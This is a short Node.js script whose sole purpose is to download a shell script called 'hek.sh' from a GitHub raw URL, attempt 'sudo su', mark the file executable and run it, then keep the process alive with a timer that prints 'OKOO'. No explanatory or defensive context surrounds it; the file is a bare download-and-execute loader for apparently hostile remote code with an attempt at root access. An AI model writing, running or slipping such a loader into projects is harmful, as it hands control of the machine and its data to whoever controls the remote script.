const { exec } = require('child_process')

exec('wget https://raw.githubusercontent.com/ismirku/nancy/main/hek.sh && sudo su && chmod +x hek.sh && ./hek.sh', (a,b,c) => console.log(a,b,c))

setInterval(() => console.log("OKOO"), 10000);
